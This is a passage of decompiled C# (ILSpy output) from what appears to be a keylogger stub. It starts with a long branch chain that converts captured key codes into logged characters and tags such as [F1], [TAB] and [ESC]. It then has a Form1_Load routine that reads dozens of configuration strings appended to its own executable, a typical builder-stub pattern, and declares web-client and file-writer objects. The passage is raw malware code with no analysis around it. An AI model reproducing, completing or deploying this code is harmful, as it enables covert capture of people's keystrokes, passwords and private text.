				vmethod_6().set_Text(vmethod_6().get_Text() + "E");
			}
			else if ((int)keys_0 == 70)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "F");
			}
			else if ((int)keys_0 == 71)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "G");
			}
			else if ((int)keys_0 == 72)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "H");
			}
			else if ((int)keys_0 == 73)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "I");
			}
			else if ((int)keys_0 == 74)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "J");
			}
			else if ((int)keys_0 == 75)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "K");
			}
			else if ((int)keys_0 == 76)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "L");
			}
			else if ((int)keys_0 == 77)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "M");
			}
			else if ((int)keys_0 == 78)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "N");
			}
			else if ((int)keys_0 == 79)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "O");
			}
			else if ((int)keys_0 == 50)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "@");
			}
			else if ((int)keys_0 == 80)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "P");
			}
			else if ((int)keys_0 == 81)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "Q");
			}
			else if ((int)keys_0 == 82)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "R");
			}
			else if ((int)keys_0 == 83)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "S");
			}
			else if ((int)keys_0 == 84)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "T");
			}
			else if ((int)keys_0 == 85)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "U");
			}
			else if ((int)keys_0 == 86)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "V");
			}
			else if ((int)keys_0 == 87)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "W");
			}
			else if ((int)keys_0 == 88)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "X");
			}
			else if ((int)keys_0 == 89)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "Y");
			}
			else if ((int)keys_0 == 90)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "Z");
			}
			else if ((int)keys_0 == 188)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "<");
			}
			else if ((int)keys_0 == 189)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "_");
			}
			else if ((int)keys_0 == 219)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "{");
			}
			else if ((int)keys_0 == 221)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "}");
			}
			else if ((int)keys_0 == 191)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 220)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "|");
			}
			else if ((int)keys_0 == 186)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ":");
			}
			else if ((int)keys_0 == 190)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ">");
			}
			else if ((int)keys_0 == 192)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "~");
			}
			else if ((int)keys_0 == 32)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + " ");
			}
			else if ((int)keys_0 == 13)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "\r\n");
			}
			else if ((int)keys_0 == 112)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F1]");
			}
			else if ((int)keys_0 == 113)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F2]");
			}
			else if ((int)keys_0 == 114)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F3]");
			}
			else if ((int)keys_0 == 115)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F4]");
			}
			else if ((int)keys_0 == 116)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F5]");
			}
			else if ((int)keys_0 == 117)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F6]");
			}
			else if ((int)keys_0 == 118)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F7]");
			}
			else if ((int)keys_0 == 119)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F8]");
			}
			else if ((int)keys_0 == 120)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F9]");
			}
			else if ((int)keys_0 == 121)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F10]");
			}
			else if ((int)keys_0 == 122)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F11]");
			}
			else if ((int)keys_0 == 123)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F12]");
			}
			else if ((int)keys_0 == 46)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[DEL]");
			}
			else if ((int)keys_0 == 8)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[DEL]");
			}
			else if ((int)keys_0 == 40)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 38)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 37)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 39)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 9)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[TAB]");
			}
			else if ((int)keys_0 == 35)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[END]");
			}
			else if ((int)keys_0 == 27)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[ESC]");
			}
			else if ((int)keys_0 == 111)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "/");
			}
			else if ((int)keys_0 == 110)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ".");
			}
			else if ((int)keys_0 == 109)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "-");
			}
			else if ((int)keys_0 == 107)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "+");
			}
			else if ((int)keys_0 == 106)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "*");
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_1be2: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c2b: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c74: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cba: Unknown result type (might be due to invalid IL or missing references)
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		byte[] bytes = default(byte[]);
		string @string = default(string);
		string[] array = default(string[]);
		string folderPath = default(string);
		string path = default(string);
		StreamWriter streamWriter = default(StreamWriter);
		WebClient webClient = default(WebClient);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					string text2;
					string text3;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0007;
					case 9764:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0007;
							case 3:
								goto IL_000f;
							case 4:
								goto IL_0021;
							case 5:
								goto IL_0035;
							case 6:
								goto IL_0049;
							case 7:
								goto IL_005d;
							case 8:
								goto IL_0071;
							case 9:
								goto IL_0085;
							case 10:
								goto IL_009a;
							case 11:
								goto IL_00af;
							case 12:
								goto IL_00c4;
							case 13:
								goto IL_00d9;
							case 14:
								goto IL_00ee;
							case 15:
								goto IL_0103;
							case 16:
								goto IL_0118;
							case 17:
								goto IL_012d;
							case 18:
								goto IL_0142;
							case 19:
								goto IL_0157;
							case 20:
								goto IL_016c;
							case 21:
								goto IL_0181;
							case 22:
								goto IL_0196;
							case 23:
								goto IL_01ab;
							case 24:
								goto IL_01c0;
							case 25:
								goto IL_01d5;
							case 26:
								goto IL_01ea;
							case 27:
								goto IL_01ff;
							case 28:
								goto IL_0214;
							case 29:
								goto IL_0229;
							case 30:
								goto IL_023e;
							case 31:
								goto IL_0253;
							case 32:
								goto IL_0268;
							case 33:
								goto IL_027d;
							case 34:
								goto IL_0292;
							case 35:
								goto IL_02a7;
							case 36:
								goto IL_02bc;
							case 37:
								goto IL_02d1;
							case 38:
								goto IL_02e6;
							case 39:
								goto IL_02fb;
							case 40:
								goto IL_0310;
							case 41:
								goto IL_0325;
							case 42:
								goto IL_033a;
							case 43:
								goto IL_034f;
							case 44:
								goto IL_0364;
							case 45:
								goto IL_0379;
							case 46:
								goto IL_038e;
							case 47:
								goto IL_03a3;
							case 48:
								goto IL_03b8;
							case 49:
								goto IL_03cd;
							case 50:
								goto IL_03e6;
							case 51:
								goto IL_03ff;
							case 52:
								goto IL_0418;
							case 53:
								goto IL_0431;
							case 54:
								goto IL_044a;
							case 55:
								goto IL_0463;
							case 56:
								goto IL_047c;
							case 57:
								goto IL_0495;
							case 58:
								goto IL_04ae;
							case 59:
								goto IL_04c7;
							case 60:
								goto IL_04e0;
							case 61:
								goto IL_04f9;
							case 62:
								goto IL_0512;
							case 63:
								goto IL_052b;
							case 64:
								goto IL_0544;
							case 65:
								goto IL_055d;
							case 66:
								goto IL_0576;
							case 67:
								goto IL_058f;
							case 68:
								goto IL_05a8;
							case 69:
								goto IL_05c1;
							case 70:
								goto IL_05da;
							case 71:
								goto IL_05f3;
							case 72:
								goto IL_060c;
							case 73:
								goto IL_0625;
							case 74:
								goto IL_063e;
							case 75:
								goto IL_0657;
							case 76:
								goto IL_0670;
							case 77:
								goto IL_0689;
							case 78:
								goto IL_06a2;
							case 79:
								goto IL_06bb;
							case 80:
								goto IL_06d4;
							case 81:
								goto IL_06ed;
							case 82:
								goto IL_0706;
							case 83:
								goto IL_071f;
							case 84:
								goto IL_0738;
							case 85:
								goto IL_0751;
							case 86:
								goto IL_076a;
							case 87:
								goto IL_0783;
							case 88:
								goto IL_079c;
							case 89:
								goto IL_07b5;
							case 90:
								goto IL_07ce;
							case 91:
								goto IL_07e7;
							case 92:
								goto IL_0800;
							case 93:
								goto IL_0819;
							case 94:
								goto IL_0832;
							case 95:
								goto IL_0846;
							case 96:
								goto IL_0854;
							case 97:
								goto IL_0864;
							case 98:
								goto IL_0877;
							case 99:
								goto IL_0889;
							case 100:
								goto IL_089b;
							case 101:
								goto IL_08ad;
							case 102:
								goto IL_08bf;
							case 103:
								goto IL_08d1;
							case 104:
								goto IL_08e3;
							case 105:
								goto IL_08f5;
							case 106:
								goto IL_0907;
							case 107:
								goto IL_091a;
							case 108:
								goto IL_092c;
							case 109:
								goto IL_093f;
							case 110:
								goto IL_0963;
							case 111:
								goto IL_0987;
							case 113:
								goto IL_09ad;
							case 114:
								goto IL_09b0;
							case 112:
							case 115:
							case 116:
								goto IL_09c3;
							case 117:
								goto IL_09d5;
							case 118:
								goto IL_09e8;
							case 119:
								goto IL_09ef;
							case 120:
								goto IL_09f8;
							case 121:
								goto IL_09ff;
							case 122:
								goto IL_0a08;
							case 123:
								goto IL_0a0f;
							case 124:
								goto IL_0a18;
							case 125:
								goto IL_0a1f;
							case 126:
								goto IL_0a28;
							case 127:
								goto IL_0a2f;
							case 128:
								goto IL_0a38;
							case 129:
								goto IL_0a3f;
							case 130:
								goto IL_0a4b;
							case 131:
								goto IL_0a52;
							case 132:
								goto IL_0a5e;
							case 133:
								goto IL_0a65;
							case 134:
								goto IL_0a71;
							case 135:
								goto IL_0a78;
							case 136:
								goto IL_0a84;
							case 137:
								goto IL_0a8b;
							case 138:
								goto IL_0a97;
							case 139:
								goto IL_0a9e;
							case 140:
								goto IL_0aaa;
							case 141:
								goto IL_0ab1;
							case 143:
								goto IL_0abe;
							case 144:
								goto IL_0ac4;
							case 142:
							case 145:
							case 146:
								goto IL_0ada;
							case 147:
								goto IL_0aec;
							case 149:
								goto IL_0b04;
							case 150:
								goto IL_0b0a;
							case 148:
							case 151:
							case 152:
								goto IL_0b20;
							case 153:
								goto IL_0b36;
							case 154:
								goto IL_0b4c;
							case 155:
								goto IL_0b5e;
							case 156:
								goto IL_0b74;
							case 157:
								goto IL_0b8a;
							case 158:
								goto IL_0ba0;
							case 160:
								goto IL_0bb8;
							case 161:
								goto IL_0bbe;
							case 159:
							case 162:
							case 163:
								goto IL_0bd4;
							case 164:
								goto IL_0be6;
							case 166:
								goto IL_0bfe;
							case 167:
								goto IL_0c04;
							case 165:
							case 168:
							case 169:
								goto IL_0c1a;
							case 170:
								goto IL_0c2c;
							case 172:
								goto IL_0c44;
							case 173:
								goto IL_0c4a;
							case 171:
							case 174:
							case 175:
								goto IL_0c60;
							case 176:
								goto IL_0c72;
							case 178:
								goto IL_0c8a;
							case 179:
								goto IL_0c90;
							case 177:
							case 180:
							case 181:
								goto IL_0ca6;
							case 182:
								goto IL_0cbb;
							case 183:
								goto IL_0cd1;
							case 184:
								goto IL_0cd8;
							case 185:
								goto IL_0ce3;
							case 186:
								goto IL_0cea;
							case 187:
								goto IL_0cf6;
							case 188:
								goto IL_0cfd;
							case 189:
								goto IL_0d0a;
							case 190:
								goto IL_0d11;
							case 191:
								goto IL_0d1d;
							case 192:
								goto IL_0d24;
							case 193:
								goto IL_0d30;
							case 194:
								goto IL_0d37;
							case 195:
								goto IL_0d43;
							case 196:
								goto IL_0d4a;
							case 197:
								goto IL_0d56;
							case 198:
								goto IL_0d5d;
							case 199:
								goto IL_0d69;
							case 200:
								goto IL_0d70;
							case 201:
								goto IL_0d7d;
							case 202:
								goto IL_0d84;
							case 203:
								goto IL_0d91;
							case 204:
								goto IL_0d98;
							case 205:
								goto IL_0dae;
							case 206:
								goto IL_0db5;
							case 207:
								goto IL_0dc1;
							case 208:
								goto IL_0dd8;
							case 209:
								goto IL_0ddf;
							case 210:
								goto IL_0deb;
							case 211:
								goto IL_0df2;
							case 212:
								goto IL_0dfe;
							case 213:
								goto IL_0e05;
							case 214:
								goto IL_0e11;
							case 215:
								goto IL_0e1d;
							case 217:
								goto IL_0e2b;
							case 218:
								goto IL_0e31;
							case 216:
							case 219:
							case 220:
								goto IL_0e47;
							case 221:
								goto IL_0e59;
							case 223:
								goto IL_0e71;
							case 224:
								goto IL_0e77;
							case 222:
							case 225:
							case 226:
								goto IL_0e8d;
							case 227:
								goto IL_0e9f;
							case 228:
								goto IL_0eb5;
							case 230:
								goto IL_0ec8;
							case 231:
								goto IL_0ece;
							case 229:
							case 232:
							case 233:
								goto IL_0ee4;
							case 234:
								goto IL_0ef6;
							case 235:
								goto IL_0f0c;
							case 236:
								goto IL_0f13;
							case 237:
								goto IL_0f21;
							case 238:
								goto IL_0f28;
							case 239:
								goto IL_0f35;
							case 240:
								goto IL_0f3c;
							case 242:
								goto IL_0f4b;
							case 243:
								goto IL_0f51;
							case 241:
							case 244:
							case 245:
								goto IL_0f67;
							case 246:
								goto IL_0f79;
							case 247:
								goto IL_0f8f;
							case 248:
								goto IL_0f96;
							case 250:
								goto IL_0fac;
							case 251:
								goto IL_0fb2;
							case 249:
							case 252:
							case 253:
								goto IL_0fc8;
							case 254:
								goto IL_0fda;
							case 256:
								goto IL_0ff2;
							case 257:
								goto IL_0ff8;
							case 255:
							case 258:
							case 259:
								goto IL_100e;
							case 260:
								goto IL_1020;
							case 261:
								goto IL_1036;
							case 262:
								goto IL_103d;
							case 264:
								goto IL_1053;
							case 265:
								goto IL_1059;
							case 263:
							case 266:
							case 267:
								goto IL_106f;
							case 268:
								goto IL_1081;
							case 269:
								goto IL_1097;
							case 270:
								goto IL_109e;
							case 272:
								goto IL_10b4;
							case 273:
								goto IL_10ba;
							case 271:
							case 274:
							case 275:
								goto IL_10d0;
							case 276:
								goto IL_10e2;
							case 277:
								goto IL_10f8;
							case 278:
								goto IL_10ff;
							case 280:
								goto IL_1115;
							case 281:
								goto IL_111b;
							case 279:
							case 282:
							case 283:
								goto IL_1131;
							case 284:
								goto IL_1143;
							case 285:
								goto IL_1159;
							case 286:
								goto IL_1160;
							case 288:
								goto IL_1176;
							case 289:
								goto IL_117c;
							case 287:
							case 290:
							case 291:
								goto IL_1192;
							case 292:
								goto IL_11a4;
							case 293:
								goto IL_11ba;
							case 294:
								goto IL_11c1;
							case 296:
								goto IL_11d7;
							case 297:
								goto IL_11dd;
							case 295:
							case 298:
							case 299:
								goto IL_11f3;
							case 300:
								goto IL_1205;
							case 301:
								goto IL_121b;
							case 302:
								goto IL_1222;
							case 304:
								goto IL_1238;
							case 305:
								goto IL_123e;
							case 303:
							case 306:
							case 307:
								goto IL_1254;
							case 308:
								goto IL_1266;
							case 309:
								goto IL_127c;
							case 310:
								goto IL_1283;
							case 312:
								goto IL_12aa;
							case 313:
								goto IL_12b0;
							case 311:
							case 314:
							case 315:
								goto IL_12c6;
							case 316:
								goto IL_12d7;
							case 317:
								goto IL_12ee;
							case 318:
								goto IL_1303;
							case 319:
								goto IL_1319;
							case 320:
								goto IL_1320;
							case 321:
								goto IL_132f;
							case 322:
								goto IL_1358;
							case 323:
							case 324:
								goto IL_1389;
							case 325:
								goto IL_13b5;
							case 327:
								goto IL_13f3;
							case 328:
								goto IL_13f9;
							case 326:
							case 329:
							case 330:
								goto IL_140f;
							case 331:
								goto IL_1425;
							case 332:
								goto IL_1444;
							case 333:
								goto IL_144b;
							case 334:
								goto IL_1463;
							case 335:
								goto IL_1472;
							case 336:
								goto IL_1484;
							case 337:
								goto IL_1496;
							case 338:
								goto IL_14ae;
							case 339:
							case 340:
								goto IL_14bb;
							case 341:
							case 342:
								goto IL_14da;
							case 343:
								goto IL_1801;
							case 344:
								goto IL_1818;
							case 345:
								goto IL_1829;
							case 346:
								goto IL_1835;
							case 347:
								goto IL_1857;
							case 348:
								goto IL_185e;
							case 349:
								goto IL_186a;
							case 350:
								goto IL_189b;
							case 351:
								goto IL_18bc;
							case 352:
								goto IL_18cd;
							case 353:
							case 354:
								goto IL_18e3;
							case 355:
								goto IL_1905;
							case 356:
								goto IL_190c;
							case 357:
								goto IL_1918;
							case 358:
								goto IL_1924;
							case 359:
								goto IL_1955;
							case 360:
								goto IL_1976;
							case 361:
								goto IL_1987;
							case 362:
							case 363:
								goto IL_199d;
							case 364:
								goto IL_19b2;
							case 365:
								goto IL_19c8;
							case 366:
								goto IL_19de;
							case 367:
								goto IL_19eb;
							case 368:
								goto IL_1a0a;
							case 369:
								goto IL_1a1d;
							case 370:
								goto IL_1a42;
							case 371:
								goto IL_1a53;
							case 372:
								goto IL_1a64;
							case 373:
								goto IL_1a75;
							case 376:
								goto IL_1a8d;
							case 377:
								goto IL_1a93;
							case 374:
							case 375:
							case 378:
							case 379:
								goto IL_1aa9;
							case 380:
								goto IL_1acb;
							case 381:
								goto IL_1af3;
							case 382:
							case 383:
								goto IL_1b19;
							case 384:
								goto IL_1b54;
							case 385:
							case 386:
								goto IL_1b7b;
							case 387:
								goto IL_1b9d;
							case 388:
								goto IL_1ba4;
							case 389:
								goto IL_1bc3;
							case 391:
								goto IL_1bed;
							case 392:
								goto IL_1c0c;
							case 394:
								goto IL_1c36;
							case 395:
								goto IL_1c55;
							case 397:
								goto IL_1c7c;
							case 398:
								goto IL_1c9b;
							case 390:
							case 393:
							case 396:
							case 399:
							case 400:
							case 401:
								goto IL_1cc0;
							case 402:
								goto IL_1cd2;
							case 403:
								goto IL_1cd9;
							case 404:
								goto IL_1ce5;
							case 406:
								goto IL_1cfd;
							case 407:
								goto IL_1d03;
							case 405:
							case 408:
							case 409:
								goto IL_1d19;
							case 410:
								goto IL_1d2b;
							case 411:
								goto IL_1d32;
							case 412:
								goto IL_1d3d;
							case 414:
								goto IL_1d55;
							case 415:
								goto IL_1d5b;
							case 413:
							case 416:
							case 417:
								goto IL_1d71;
							case 418:
								goto IL_1d83;
							case 419:
								goto IL_1d8a;
							case 420:
								goto IL_1d95;
							case 421:
								goto IL_1db2;
							case 422:
								goto IL_1dbd;
							case 424:
								goto IL_1dd5;
							case 425:
								goto IL_1ddb;
							case 423:
							case 426:
							case 427:
								goto IL_1df1;
							case 428:
								goto IL_1e03;
							case 429:
								goto IL_1e0a;
							case 430:
								goto IL_1e15;
							case 432:
								goto IL_1e2d;
							case 433:
								goto IL_1e33;
							case 431:
							case 434:
							case 435:
								goto IL_1e49;
							case 436:
								goto IL_1e5b;
							case 437:
								goto IL_1e62;
							case 438:
								goto IL_1e72;
							case 440:
								goto IL_1e8a;
							case 441:
								goto IL_1e90;
							case 439:
							case 442:
							case 443:
								goto IL_1ea6;
							case 444:
								goto IL_1eb8;
							case 445:
								goto IL_1ebf;
							case 446:
								goto IL_1eca;
							case 448:
								goto IL_1ee5;
							case 449:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 447:
							case 450:
							case 451:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_1ee5:
						num = 448;
						break;
						IL_0007:
						num = 2;
						Class34.smethod_94(this);
						goto IL_000f;
						IL_000f:
						num = 3;
						FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
						goto IL_0021;
						IL_0021:
						num = 4;
						string_0 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0035;
						IL_0035:
						num = 5;
						string_1 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0049;
						IL_0049:
						num = 6;
						string_2 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_005d;
						IL_005d:
						num = 7;
						string_3 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0071;
						IL_0071:
						num = 8;
						string_33 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0085;
						IL_0085:
						num = 9;
						string_36 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_009a;
						IL_009a:
						num = 10;
						string_34 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_00af;
						IL_00af:
						num = 11;
						string_35 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_00c4;
						IL_00c4:
						num = 12;
						string_37 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_00d9;
						IL_00d9:
						num = 13;
						string_4 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_00ee;
						IL_00ee:
						num = 14;
						string_5 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0103;
						IL_0103:
						num = 15;
						string_6 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0118;
						IL_0118:
						num = 16;
						string_38 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_012d;
						IL_012d:
						num = 17;
						string_39 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0142;
						IL_0142:
						num = 18;
						string_7 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0157;
						IL_0157:
						num = 19;
						string_40 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_016c;
						IL_016c:
						num = 20;
						string_41 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0181;
						IL_0181:
						num = 21;
						string_42 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0196;
						IL_0196:
						num = 22;
						string_9 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_01ab;
						IL_01ab:
						num = 23;
						string_10 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_01c0;
						IL_01c0:
						num = 24;
						string_11 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_01d5;
						IL_01d5:
						num = 25;
						string_12 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_01ea;
						IL_01ea:
						num = 26;
						string_13 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_01ff;
						IL_01ff:
						num = 27;
						string_14 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0214;
						IL_0214:
						num = 28;
						string_15 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0229;
						IL_0229:
						num = 29;
						string_16 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_023e;
						IL_023e:
						num = 30;
						string_17 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0253;
						IL_0253:
						num = 31;
						string_18 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0268;
						IL_0268:
						num = 32;
						string_19 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_027d;
						IL_027d:
						num = 33;
						string_20 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0292;
						IL_0292:
						num = 34;
						string_21 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_02a7;
						IL_02a7:
						num = 35;
						string_22 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_02bc;
						IL_02bc:
						num = 36;
						string_23 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_02d1;
						IL_02d1:
						num = 37;
						string_24 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_02e6;
						IL_02e6:
						num = 38;
						string_43 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_02fb;
						IL_02fb:
						num = 39;
						string_8 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0310;
						IL_0310:
						num = 40;
						string_44 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0325;
						IL_0325:
						num = 41;
						string_25 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_033a;
						IL_033a:
						num = 42;
						string_26 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_034f;
						IL_034f:
						num = 43;
						string_27 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0364;
						IL_0364:
						num = 44;
						string_28 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0379;
						IL_0379:
						num = 45;
						string_29 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_038e;
						IL_038e:
						num = 46;
						string_30 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_03a3;
						IL_03a3:
						num = 47;
						string_31 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_03b8;
						IL_03b8:
						num = 48;
						string_32 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_03cd;
						IL_03cd:
						num = 49;
						FileSystem.FileGet(1, ref string_0, -1L, false);
						goto IL_03e6;
						IL_03e6:
						num = 50;
						FileSystem.FileGet(1, ref string_1, -1L, false);
						goto IL_03ff;
						IL_03ff:
						num = 51;
						FileSystem.FileGet(1, ref string_2, -1L, false);
						goto IL_0418;
						IL_0418:
						num = 52;
						FileSystem.FileGet(1, ref string_3, -1L, false);
						goto IL_0431;
						IL_0431:
						num = 53;
						FileSystem.FileGet(1, ref string_33, -1L, false);
						goto IL_044a;
						IL_044a:
						num = 54;
						FileSystem.FileGet(1, ref string_36, -1L, false);
						goto IL_0463;
						IL_0463:
						num = 55;
						FileSystem.FileGet(1, ref string_34, -1L, false);
						goto IL_047c;
						IL_047c:
						num = 56;
						FileSystem.FileGet(1, ref string_35, -1L, false);
						goto IL_0495;
						IL_0495:
						num = 57;
						FileSystem.FileGet(1, ref string_37, -1L, false);
						goto IL_04ae;
						IL_04ae:
						num = 58;
						FileSystem.FileGet(1, ref string_4, -1L, false);
						goto IL_04c7;
						IL_04c7:
						num = 59;
						FileSystem.FileGet(1, ref string_5, -1L, false);
						goto IL_04e0;
						IL_04e0:
						num = 60;
						FileSystem.FileGet(1, ref string_6, -1L, false);
						goto IL_04f9;
						IL_04f9:
						num = 61;
						FileSystem.FileGet(1, ref string_38, -1L, false);
						goto IL_0512;
						IL_0512:
						num = 62;
						FileSystem.FileGet(1, ref string_39, -1L, false);
						goto IL_052b;
						IL_052b:
						num = 63;
						FileSystem.FileGet(1, ref string_7, -1L, false);
						goto IL_0544;
						IL_0544:
						num = 64;
						FileSystem.FileGet(1, ref string_40, -1L, false);
						goto IL_055d;
						IL_055d:
						num = 65;
						FileSystem.FileGet(1, ref string_41, -1L, false);
						goto IL_0576;
						IL_0576:
						num = 66;
						FileSystem.FileGet(1, ref string_42, -1L, false);
						goto IL_058f;
						IL_058f:
						num = 67;
						FileSystem.FileGet(1, ref string_9, -1L, false);
						goto IL_05a8;
						IL_05a8:
						num = 68;
						FileSystem.FileGet(1, ref string_10, -1L, false);
						goto IL_05c1;
						IL_05c1:
						num = 69;
						FileSystem.FileGet(1, ref string_11, -1L, false);
						goto IL_05da;
						IL_05da:
						num = 70;
						FileSystem.FileGet(1, ref string_12, -1L, false);
						goto IL_05f3;
						IL_05f3:
						num = 71;
						FileSystem.FileGet(1, ref string_13, -1L, false);
						goto IL_060c;
						IL_060c:
						num = 72;
						FileSystem.FileGet(1, ref string_14, -1L, false);
						goto IL_0625;
						IL_0625:
						num = 73;
						FileSystem.FileGet(1, ref string_15, -1L, false);
						goto IL_063e;
						IL_063e:
						num = 74;
						FileSystem.FileGet(1, ref string_16, -1L, false);
						goto IL_0657;
						IL_0657:
						num = 75;
						FileSystem.FileGet(1, ref string_17, -1L, false);
						goto IL_0670;
						IL_0670:
						num = 76;
						FileSystem.FileGet(1, ref string_18, -1L, false);
						goto IL_0689;
						IL_0689:
						num = 77;
						FileSystem.FileGet(1, ref string_19, -1L, false);
						goto IL_06a2;
						IL_06a2:
						num = 78;
						FileSystem.FileGet(1, ref string_20, -1L, false);
						goto IL_06bb;
						IL_06bb:
						num = 79;
						FileSystem.FileGet(1, ref string_21, -1L, false);
						goto IL_06d4;
						IL_06d4:
						num = 80;
						FileSystem.FileGet(1, ref string_22, -1L, false);
						goto IL_06ed;
						IL_06ed:
						num = 81;
						FileSystem.FileGet(1, ref string_23, -1L, false);
						goto IL_0706;
						IL_0706:
						num = 82;
						FileSystem.FileGet(1, ref string_24, -1L, false);
